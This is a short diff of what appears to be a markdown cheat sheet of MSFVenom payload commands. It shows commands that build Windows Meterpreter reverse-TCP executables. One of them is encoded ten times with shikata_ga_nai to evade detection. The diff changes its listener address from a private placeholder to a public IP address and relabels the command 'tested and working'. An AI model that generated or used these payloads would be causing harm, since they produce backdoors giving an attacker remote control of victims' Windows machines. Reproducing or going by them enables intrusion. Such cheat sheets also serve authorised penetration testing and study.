@@ -7,9 +7,9 @@ Examples of previously created MSFVenom payloads required in the different scena
 msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o shell.exe
 ```
 
-##### Encoded multiple times:
+##### Encoded multiple times - tested and working:
 ```
-msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe
+msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=212.219.14.55 LPORT=443 -b "\x00" -f exe -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe
 ```
 
 ##### Reverse HTTPS with proxy authentication:
